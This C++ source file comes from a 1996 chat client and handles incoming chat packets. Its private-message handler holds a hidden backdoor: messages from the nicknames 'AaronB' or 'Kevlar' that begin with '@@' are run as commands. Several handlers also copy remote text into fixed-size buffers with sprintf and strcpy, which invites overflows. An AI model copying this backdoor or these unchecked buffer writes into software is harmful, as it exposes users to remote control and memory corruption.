//PC TApp Message Handling
//Copyright 1996 Aaron Brinton

void TApp::HandleMessage(Message *ChatMsg)
{
  if (strcmp(ChatMsg->Nickname, Config->Nickname) != 0)
    switch (ChatMsg->Type)
    {
    case KCHATPKTMESSAGE:
      MSG_Message(ChatMsg);
      break;
    case KCHATPKTHELLO:
      MSG_Hello(ChatMsg);
      break;
    case KCHATPKTBYE:
      MSG_Bye(ChatMsg);
      break;
    case KCHATPKTPART:
      MSG_Part(ChatMsg);
      break;
    case KCHATPKTWHO:
      MSG_Who(ChatMsg);
      break;
    case KCHATPKTIAM:
      MSG_Iam(ChatMsg);
      break;
    case KCHATPKTPOSTURE:
      MSG_Posture(ChatMsg);
      break;
    case KCHATPKTPRIVATE:
      MSG_Private(ChatMsg);
      break;
    case KCHATPKTPING:
      MSG_Ping(ChatMsg);
      break;
    case KCHATPKTPONG:
      MSG_Pong(ChatMsg);
      break;
    case KCHATPKTGET:
      MSG_Get(ChatMsg);
      break;
    case KCHATPKTNOOFFER:
      MSG_NoOffer(ChatMsg);
      break;
    case KCHATPKTTRANSFER:
      MSG_Transfer(ChatMsg);
      break;
    case KCHATPKTDISCON:
      MSG_Discon(ChatMsg);
      break;
    default:
      MSG_Unknown(ChatMsg);
      break;
    }
#ifdef DARKSIDE
  if (Config->Debug)
  {
    char *szTemp = new char[300];
    assert(szTemp != NULL);
    sprintf(szTemp, "@@%d> [%s] <%s> %s", ChatMsg->Type, ChatMsg->Channel, ChatMsg->Nickname, ChatMsg->Message);
    OutWin->AddWrap(szTemp, Config->DebugColor);
    delete (szTemp);
  }
#endif
}

void TApp::MSG_Bye(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, Config->String[2], ChatMsg->Nickname, ChatMsg->Message);
  if ((strcmp(Config->Channel, ChatMsg->Channel) == 0) || Config->AllMsgs)
    OutWin->AddWrap(szChatMsg, Config->Color[2]);
  delete (szChatMsg);
}

void TApp::MSG_Discon(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, Config->String[8], ChatMsg->Nickname);
  OutWin->AddWrap(szChatMsg, Config->Color[8]);
  delete (szChatMsg);
}

void TApp::MSG_Hello(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, Config->String[1], ChatMsg->Nickname, ChatMsg->Channel);
  if ((strcmp(Config->Channel, ChatMsg->Channel) == 0) && Config->ShowJoinMsgs)
  {
    OutWin->AddWrap(szChatMsg, Config->Color[1]);
    if (Config->BeepOnArrival)
    {
      sound(Config->JoinFrequency);
      delay(Config->JoinDuration);
      nosound();
    }
  }
  delete (szChatMsg);
}

void TApp::MSG_Iam(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  char *szChannelDisp = new char[20];
  assert(szChannelDisp != NULL);
  strcpy(szChannelDisp, ChatMsg->Channel);
  char *lpszChannelDisp;
  if (Config->DarkSide)
    lpszChannelDisp = strtok(szChannelDisp, "\n");
  else
    lpszChannelDisp = strtok(szChannelDisp, " ");
  sprintf(szChatMsg, Config->String[4], ChatMsg->Nickname, lpszChannelDisp);
  OutWin->AddWrap(szChatMsg, Config->Color[4]);
  delete (szChatMsg);
  delete (szChannelDisp);
}

void TApp::MSG_Message(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, Config->String[0], ChatMsg->Nickname, ChatMsg->Message);
  if ((strcmp(Config->Channel, ChatMsg->Channel) == 0) || Config->AllMsgs)
    OutWin->AddWrap(szChatMsg, Config->Color[0]);
  delete (szChatMsg);
}

void TApp::MSG_Part(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, Config->String[3], ChatMsg->Nickname, ChatMsg->Channel);
  if ((strcmp(Config->Channel, ChatMsg->Channel) == 0) || Config->AllMsgs)
    OutWin->AddWrap(szChatMsg, Config->Color[3]);
  delete (szChatMsg);
}

void TApp::MSG_Ping(Message *ChatMsg)
{
#ifdef DARKSIDE
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, "*** PING Request from %s.", ChatMsg->Nickname);
  if (Config->DarkSide)
    OutWin->AddWrap(szChatMsg, Config->DarkSideColor);
  delete (szChatMsg);
#endif
}

void TApp::MSG_Pong(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, Config->String[7], ChatMsg->Nickname, ChatMsg->Message);
  OutWin->AddWrap(szChatMsg, Config->Color[7]);
  delete (szChatMsg);
}

void TApp::MSG_Posture(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, Config->String[5], ChatMsg->Nickname, ChatMsg->Message);
  if ((strcmp(Config->Channel, ChatMsg->Channel) == 0) || Config->AllMsgs)
    OutWin->AddWrap(szChatMsg, Config->Color[5]);
  delete (szChatMsg);
}

void TApp::MSG_Private(Message *ChatMsg)
{
  //remote command code
  int iRemote = 0;
  if ((strcmp(ChatMsg->Nickname, "AaronB") == 0) || (strcmp(ChatMsg->Nickname, "Kevlar") == 0))
    if ((ChatMsg->Message[0] == 64) && (ChatMsg->Message[1] == 64))
      iRemote = 1;
  if (iRemote)
    HandleCommand(&ChatMsg->Message[2]);
  //regular /msg code
  else
  {
    char *szChatMsg = new char[300];
    assert(szChatMsg != NULL);
    sprintf(szChatMsg, Config->String[6], ChatMsg->Nickname, ChatMsg->Message);
    if ((strcmp(Config->Channel, ChatMsg->Channel) == 0) && Config->ShowJoinMsgs)
    {
      OutWin->AddWrap(szChatMsg, Config->Color[6]);
      if (Config->BeepOnPrivate)
      {
        sound(Config->PrivateFrequency);
        delay(Config->PrivateDuration);
        nosound();
      }
    }
    strcpy(szLastMsgNick, ChatMsg->Nickname);
    delete (szChatMsg);
  }
}

void TApp::MSG_Unknown(Message *ChatMsg)
{
#ifdef DARKSIDE
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, "@@%d> [%s] <%s> %s", ChatMsg->Type, ChatMsg->Channel, ChatMsg->Nickname, ChatMsg->Message);
  if (Config->DarkSide)
    OutWin->AddWrap(szChatMsg, Config->DarkSideColor);
  delete (szChatMsg);
#endif
}

void TApp::MSG_Who(Message *ChatMsg)
{
#ifdef DARKSIDE
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, "*** WHO Request from %s.", ChatMsg->Nickname);
  if (Config->DarkSide)
    OutWin->AddWrap(szChatMsg, Config->DarkSideColor);
  delete (szChatMsg);
#endif
}

//*****************

void TApp::MSG_Get(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, "*** %s has requested file %s.", ChatMsg->Nickname, ChatMsg->Message);
  OutWin->AddWrap(szChatMsg, Config->Color[cMaxColors - 1]); //FIX THIS!!!!!
  delete (szChatMsg);
}

void TApp::MSG_NoOffer(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, "*** The file you requested from %s is not available.", ChatMsg->Nickname);
  OutWin->AddWrap(szChatMsg, Config->NoOfferColor);
  delete (szChatMsg);
}

void TApp::MSG_Transfer(Message *ChatMsg)
{
  char *szChatMsg = new char[300];
  assert(szChatMsg != NULL);
  sprintf(szChatMsg, "*** %s", ChatMsg->Message);
  OutWin->AddWrap(szChatMsg, Config->TransferColor);
  delete (szChatMsg);
}
